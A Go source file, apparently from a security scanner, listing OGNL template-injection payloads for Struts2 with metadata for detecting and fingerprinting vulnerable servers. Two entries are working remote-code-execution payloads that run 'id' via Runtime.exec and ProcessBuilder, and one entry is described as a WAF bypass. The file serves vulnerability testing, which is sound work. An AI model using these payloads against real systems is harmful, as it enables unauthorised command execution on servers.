package ssti

// OGNL payloads (Struts2, WebWork).
// S2-001 through S2-062 evaluate OGNL via %{...} or ${...} in form fields,
// URL parameters, Content-Type, and other headers.
var ognlPayloads = []Payload{
	// Detection — math
	{
		Value:           "%{7*7}",
		Engine:          EngineOGNL,
		Type:            TypeDetection,
		Description:     "OGNL math via Struts2 %{} syntax",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "%{3+4}",
		Engine:          EngineOGNL,
		Type:            TypeDetection,
		Description:     "OGNL addition via %{} syntax",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "7",
	},
	{
		Value:           "%{#context}",
		Engine:          EngineOGNL,
		Type:            TypeFingerprint,
		Description:     "OGNL context leak — reveals OgnlContext map",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "OgnlContext",
	},
	{
		Value:           "%{#application}",
		Engine:          EngineOGNL,
		Type:            TypeFingerprint,
		Description:     "OGNL application scope",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "org.apache.struts2",
	},
	// RCE — Struts2 S2-001 / S2-045 / S2-052 style
	{
		Value:           "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}",
		Engine:          EngineOGNL,
		Type:            TypeRCE,
		Description:     "OGNL RCE via Runtime.exec",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}",
		Engine:          EngineOGNL,
		Type:            TypeRCE,
		Description:     "OGNL RCE via ProcessBuilder with response output",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// WAF bypass variants
	{
		Value:           "${7*7}",
		Engine:          EngineOGNL,
		Type:            TypeDetection,
		Description:     "OGNL math via EL ${} syntax (also evaluated by Struts2)",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "%{'OGNL_TEST'}",
		Engine:          EngineOGNL,
		Type:            TypeFingerprint,
		Description:     "OGNL string literal reflection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "OGNL_TEST",
	},
}
